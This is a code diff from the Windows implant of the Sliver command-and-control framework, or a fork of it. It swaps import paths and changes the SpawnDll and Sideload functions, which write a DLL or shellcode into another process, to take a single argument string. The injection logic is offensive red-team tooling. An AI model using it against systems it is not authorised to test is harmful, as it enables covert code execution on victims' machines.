@@ -31,17 +31,15 @@ import (
 	"time"
 	"unsafe"
 
+	"github.com/bishopfox/sliver/implant/sliver/spoof"
 	"syscall"
-
-	"github.com/starkzarn/glod/implant/sliver/spoof"
-
 	// {{if .Config.Evasion}}
-	"github.com/starkzarn/glod/implant/sliver/evasion"
-	"github.com/starkzarn/glod/implant/sliver/version"
+	"github.com/bishopfox/sliver/implant/sliver/evasion"
+	"github.com/bishopfox/sliver/implant/sliver/version"
 
 	// {{end}}
 
-	"github.com/starkzarn/glod/implant/sliver/syscalls"
+	"github.com/bishopfox/sliver/implant/sliver/syscalls"
 	"golang.org/x/sys/windows"
 )
 
@@ -345,7 +343,7 @@ func ExecuteAssembly(data []byte, process string, processArgs []string, ppid uin
 	return stdoutBuf.String() + stderrBuf.String(), nil
 }
 
-func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args []string, kill bool) (string, error) {
+func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, offset uint32, args string, kill bool) (string, error) {
 	var lpTargetHandle windows.Handle
 	err := refresh()
 	if err != nil {
@@ -384,12 +382,11 @@ func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, o
 	defer windows.CloseHandle(lpTargetHandle)
 	dataAddr, err := allocAndWrite(data, lpTargetHandle, uint32(len(data)))
 	argAddr := uintptr(0)
-	argsStr := strings.Join(args, " ")
-	if len(argsStr) > 0 {
+	if len(args) > 0 {
 		//{{if .Config.Debug}}
-		log.Printf("Args: %s\n", argsStr)
+		log.Printf("Args: %s\n", args)
 		//{{end}}
-		argsArray := []byte(argsStr)
+		argsArray := []byte(args)
 		argAddr, err = allocAndWrite(argsArray, lpTargetHandle, uint32(len(argsArray)))
 		if err != nil {
 			return "", err
@@ -422,8 +419,8 @@ func SpawnDll(procName string, processArgs []string, ppid uint32, data []byte, o
 }
 
 // SideLoad - Side load a binary as shellcode and returns its output
-func Sideload(procName string, procArgs []string, ppid uint32, data []byte, args []string, kill bool) (string, error) {
-	return SpawnDll(procName, procArgs, ppid, data, 0, []string{""}, kill)
+func Sideload(procName string, procArgs []string, ppid uint32, data []byte, args string, kill bool) (string, error) {
+	return SpawnDll(procName, procArgs, ppid, data, 0, "", kill)
 }
 
 // Util functions
